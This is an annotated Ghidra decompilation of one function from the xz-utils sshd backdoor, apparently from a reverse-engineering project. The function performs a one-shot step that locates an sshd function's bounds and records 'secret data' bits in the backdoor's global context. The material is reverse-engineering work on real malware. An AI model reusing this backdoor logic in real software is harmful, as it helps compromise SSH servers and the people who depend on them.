// /home/kali/xzre-ghidra/xzregh/10AAC0_secret_data_append_singleton.c
// Function: secret_data_append_singleton @ 0x10AAC0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall secret_data_append_singleton(u8 * call_site, u8 * code, secret_data_shift_cursor_t shift_cursor, uint shift_count, uint operation_index)


/*
 * AutoDoc: One-shot wrapper around `secret_data_append_from_code`. Each descriptor guards itself with the
 * `global_ctx->shift_operations[operation_index]` byte, discovers the function bounds via `find_function` and the cached sshd text
 * limits, feeds the resulting range into `secret_data_append_from_code`, and increments `global_ctx->num_shifted_bits` when bits were
 * emitted. Subsequent calls become no-ops that report TRUE so callers can treat the slot as satisfied.
 */
#include "xzre_types.h"

BOOL secret_data_append_singleton
               (u8 *call_site,u8 *code,secret_data_shift_cursor_t shift_cursor,uint shift_count,
               uint operation_index)

{
  long shared_ctx_addr;
  BOOL append_ok;
  void *function_start;
  
  shared_ctx_addr = global_ctx;
  function_start = (void *)0x0;
  // AutoDoc: Skip the work when the loader never published `global_ctx` or when this slot already emitted its bits.
  if ((global_ctx == 0) || (*(char *)(global_ctx + 0x141 + (ulong)operation_index) != '\0')) {
LAB_0010ab60:
    append_ok = TRUE;
  }
  else {
    // AutoDoc: Mark the shift-operation byte so later invocations bail immediately.
    *(u8 *)(global_ctx + 0x141 + (ulong)operation_index) = 1;
    // AutoDoc: Resolve the enclosing sshd function by reusing the cached `(text_start, text_end)` window from `global_ctx`.
    append_ok = find_function(code,&function_start,(void **)0x0,*(u8 **)(shared_ctx_addr + 0x80),
                          *(u8 **)(shared_ctx_addr + 0x88),FIND_NOP);
    if (append_ok != FALSE) {
      // AutoDoc: Feed the resolved range to the instruction walker; when `call_site` is NULL we ask it to locate the next CALL before scanning.
      append_ok = secret_data_append_from_code
                        (function_start,*(void **)(global_ctx + 0x88),shift_cursor,shift_count,
                         (uint)(call_site == (u8 *)0x0));
      if (append_ok != FALSE) {
        // AutoDoc: Keep the aggregate `num_shifted_bits` counter in sync so policy helpers can see how many attestation bits landed.
        *(int *)(global_ctx + 0x160) = *(int *)(global_ctx + 0x160) + shift_count;
        goto LAB_0010ab60;
      }
    }
    append_ok = FALSE;
  }
  return append_ok;
}

